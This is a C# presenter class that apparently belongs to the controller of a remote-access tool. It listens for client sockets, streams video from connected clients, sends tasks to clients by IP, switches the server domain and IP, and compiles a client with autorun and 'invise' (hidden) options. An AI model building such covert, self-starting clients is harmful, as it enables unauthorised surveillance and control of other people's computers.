using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using networkWork.view;
using networkWork.model;
using System.Net.Sockets;

namespace networkWork.presenter
{
    public class mainPresenter
    {
        private videoStream vS;
        private mainWindow mW;

        public mainPresenter(videoStream vS, mainWindow mW)
        {
            this.vS = vS;
            this.mW = mW;

            vS.connectionClientEvent += mW.connectionClient;
            vS.shutdownClientEvent += mW.shutdownClient;
            mW.streamStart += startStreem;
            mW.sendInfo += MW_sendInfo;
            mW.ipEvent += MW_ipEvent;
            mW.compile += MW_compile; ;
            taskStream.message += mW.message;

            vS.listenSocets(10);
        }

        private void MW_ipEvent(ipMode mode, string value) 
        {
            Task.Run(() =>
            {
               try
               {
                   switch (mode)
                   {
                       case ipMode.checkIp:
                           mW.message(GO.parceIP(value), "IP");
                           break;
                       case ipMode.getCurentIp:
                           mW.message(GO.parceIP("https://2ip.ru", "<big id=\"d_clip_button\">(.*)</big>"), "Curent IP");
                           break;
                       case ipMode.getDomain:
                           mW.message(GO.getDomain(), "Domain");
                           break;
                       case ipMode.getDomainIp:
                           mW.message(GO.parceIP(GO.getDomain()), "IP for domain");
                           break;
                       case ipMode.setNewDomein:
                           GO.writeNewDomein(value);
                           mW.message($"Completed {value}", "New domain");
                           break;
                       case ipMode.setNewIp:
                           mW.message($"Response {GO.setNewIp(value)}", "New ip");
                           break;
                   }
               }
               catch (Exception e)
               {
                   mW.message($"{e.Message} :(", "Error!");
               }
            });             
        }

        private void MW_sendInfo(int clientsCount, string ip, string task, string atribute)
        {
            taskStream.sendTask(clientsCount, ip, task, atribute);
        }

        private void startStreem(Socket client, streamWindow sW)
        {
            sW.client = client;
            sW.streamId = vS.startStreaming(client, sW.drawing);
            sW.buttonTask += vS.sendTask;
            sW.closeWindow += vS.stopStreaming;
        }

        private void MW_compile(compileMode mode, string server, bool autoRun, bool invise, string path)
        {
            try
            {
                clientCompiler.compile(mode, server, autoRun, invise, path);
                mW.message("Сompile successfully :)", "Сompile!");
            }
            catch(Exception e)
            {
                mW.message($"{e.Message} :(", "Error!");
            }
        }
    }
}
